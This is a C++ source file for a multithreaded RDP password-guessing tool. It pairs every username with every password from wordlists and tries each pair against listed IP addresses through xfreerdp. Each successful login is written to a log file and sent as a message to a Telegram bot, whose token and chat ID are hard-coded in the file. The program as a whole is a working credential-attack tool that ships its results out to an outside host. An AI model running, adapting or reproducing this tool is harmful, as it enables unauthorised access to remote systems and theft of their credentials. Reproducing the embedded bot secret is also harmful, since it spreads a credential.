#include <sstream>
#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <thread>
#include <mutex>
#include <queue>
#include <condition_variable>
#include <atomic>
#include <cstdlib>
#include <cstring>
#include <curl/curl.h>
#include <algorithm>
#include <csignal>
#include <chrono>

// Mutexes for thread safety
std::mutex output_mutex;
std::mutex queue_mutex;
std::condition_variable cv;
std::atomic<bool> found_valid_credentials(false);
std::atomic<bool> should_exit(false);

// Telegram Bot Details
const std::string TELEGRAM_BOT_TOKEN = "7079921472:AAHcrHtlpUpRYW3fuQJk3Ha45dX15yPQDGY";
const std::string TELEGRAM_CHAT_ID = "1073690504";

// Structs
struct Credential {
    std::string username;
    std::string password;
};

struct Target {
    std::string ip;
    std::chrono::system_clock::time_point last_attempt;
};

// Signal handler
void signal_handler(int signal) {
    should_exit = true;
    cv.notify_all();
}

// Function to read file lines into a vector
std::vector<std::string> read_file(const std::string &filepath) {
    std::vector<std::string> lines;
    std::ifstream file(filepath);
    if (!file) {
        std::cerr << "Error: Cannot open file " << filepath << std::endl;
        return lines;
    }
    std::string line;
    while (std::getline(file, line)) {
        if (!line.empty()) {
            // Trim whitespace
            line.erase(0, line.find_first_not_of(" \t\n\r\f\v"));
            line.erase(line.find_last_not_of(" \t\n\r\f\v") + 1);
            if (!line.empty()) {
                lines.push_back(line);
            }
        }
    }
    return lines;
}

std::vector<Credential> generate_combinations(const std::vector<std::string> &usernames, 
                                           const std::vector<std::string> &passwords) {
    std::vector<Credential> credentials;
    credentials.reserve(usernames.size() * passwords.size());
    for (const auto &user : usernames) {
        for (const auto &pass : passwords) {
            credentials.push_back({user, pass});
        }
    }
    return credentials;
}

void send_telegram_message(const std::string &message) {
    std::unique_ptr<CURL, decltype(&curl_easy_cleanup)> curl(curl_easy_init(), curl_easy_cleanup);
    if (!curl) {
        std::cerr << "Failed to initialize CURL" << std::endl;
        return;
    }

    std::string url = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendMessage";
    std::unique_ptr<char, decltype(&curl_free)> escaped_message(
        curl_easy_escape(curl.get(), message.c_str(), 0),
        curl_free
    );
    
    if (!escaped_message) {
        std::cerr << "Failed to escape message" << std::endl;
        return;
    }

    std::string post_data = "chat_id=" + TELEGRAM_CHAT_ID + "&text=" + escaped_message.get();

    curl_easy_setopt(curl.get(), CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl.get(), CURLOPT_POST, 1L);
    curl_easy_setopt(curl.get(), CURLOPT_POSTFIELDS, post_data.c_str());
    curl_easy_setopt(curl.get(), CURLOPT_TIMEOUT, 10L);
    
    CURLcode res = curl_easy_perform(curl.get());
    if(res != CURLE_OK) {
        std::cerr << "Telegram notification failed: " << curl_easy_strerror(res) << std::endl;
    }
}

void try_rdp_login(const Target &target, const Credential &cred, const std::string &domain) {
    if (should_exit) return;

    // Input validation
    if (target.ip.empty() || cred.username.empty() || cred.password.empty() || domain.empty()) {
        std::cerr << "Invalid input parameters" << std::endl;
        return;
    }

    // Sanitize inputs
    auto sanitize = [](std::string str) {
        std::string dangerous_chars = ";&|`$(){}[]<>\\\"'";
        for (char c : dangerous_chars) {
            str.erase(std::remove(str.begin(), str.end(), c), str.end());
        }
        return str;
    };

    std::string escaped_ip = sanitize(target.ip);
    std::string escaped_user = sanitize(cred.username);
    std::string escaped_pass = sanitize(cred.password);
    std::string escaped_domain = sanitize(domain);

    // Create a temporary file for output
    std::string output_file = "/tmp/rdp_output_" + std::to_string(std::rand());
    std::string command = "xfreerdp /v:" + escaped_ip + " /u:" + escaped_user + 
                         " /p:" + escaped_pass + " /d:" + escaped_domain + 
                         " /auth-only /cert-ignore /sec:rdp 2>&1 | tee " + output_file;

    int result = std::system(command.c_str());

    // Read the output
    std::string output;
    std::ifstream output_stream(output_file);
    if (output_stream) {
        std::stringstream buffer;
        buffer << output_stream.rdbuf();
        output = buffer.str();
        output_stream.close();
        std::remove(output_file.c_str());
    }

    std::lock_guard<std::mutex> lock(output_mutex);
    // Check both the return code and output for authentication success
    bool auth_success = (output.find("Authentication only, exit status 0") != std::string::npos) &&
                       (output.find("ERRCONNECT_LOGON_FAILURE") == std::string::npos);
    
    if (auth_success) {
        std::string success_msg = "[SUCCESS] " + target.ip + " -> " + cred.username + " / " + cred.password;
        std::cout << success_msg << std::endl;
        
        std::ofstream log_file("success_log.txt", std::ios::app);
        if (log_file) {
            log_file << target.ip << " " << cred.username << " " << cred.password 
                    << " " << std::chrono::system_clock::now().time_since_epoch().count() << std::endl;
        }

        send_telegram_message(success_msg);
        } else {
        std::cout << "[FAILED] " << target.ip << " -> " << cred.username << " / " << cred.password << "\n";
        if (!output.empty()) {
            std::cout << "Error details: " << output << std::endl;
        }
    }
}

void process_targets(std::queue<Target> &target_queue, const std::vector<Credential> &credentials, 
                    const std::string &domain) {
    while (!should_exit) {
        Target target;
        {
            std::unique_lock<std::mutex> lock(queue_mutex);
            cv.wait(lock, [&]() { 
                return !target_queue.empty() || should_exit; 
            });

            if (target_queue.empty() || should_exit) return;
            target = target_queue.front();
            target_queue.pop();
        }

        for (const auto &cred : credentials) {
            if (found_valid_credentials || should_exit) return;
            try_rdp_login(target, cred, domain);
            std::this_thread::sleep_for(std::chrono::milliseconds(100)); // Rate limiting
        }
    }
}

int main(int argc, char *argv[]) {
    // Set up signal handling
    std::signal(SIGINT, signal_handler);
    std::signal(SIGTERM, signal_handler);

    if (argc < 4) {
        std::cerr << "Usage: " << argv[0] << " <target_list> <password_list> <username_list>" << std::endl;
        return 1;
    }

    // Initialize CURL globally
    if (curl_global_init(CURL_GLOBAL_ALL) != CURLE_OK) {
        std::cerr << "Failed to initialize CURL" << std::endl;
        return 1;
    }

    std::vector<std::string> target_ips = read_file(argv[1]);
    std::vector<std::string> passwords = read_file(argv[2]);
    std::vector<std::string> usernames = read_file(argv[3]);
    std::string domain = "domain";

    if (target_ips.empty() || passwords.empty() || usernames.empty()) {
        std::cerr << "Error: One or more input files are empty." << std::endl;
        curl_global_cleanup();
        return 1;
    }

    std::vector<Credential> credentials = generate_combinations(usernames, passwords);
    std::cout << "Loaded " << target_ips.size() << " targets and " << credentials.size() << " credential pairs." << std::endl;

    const int num_threads = std::max(1u, std::thread::hardware_concurrency());
    std::queue<Target> target_queue;

    for (const auto &ip : target_ips) {
        target_queue.push({ip, std::chrono::system_clock::now()});
    }

    std::vector<std::thread> workers;
    workers.reserve(num_threads);
    for (int i = 0; i < num_threads; i++) {
        workers.emplace_back(process_targets, std::ref(target_queue), std::ref(credentials), domain);
    }

    cv.notify_all();

    for (auto &worker : workers) {
        worker.join();
    }

    curl_global_cleanup();

    if (should_exit) {
        std::cout << "\nGracefully shutting down..." << std::endl;
    } else if (!found_valid_credentials) {
        std::cout << "No valid credentials found." << std::endl;
    } else {
        std::cout << "Check success_log.txt for valid credentials." << std::endl;
    }

    return found_valid_credentials ? 0 : 1;
}
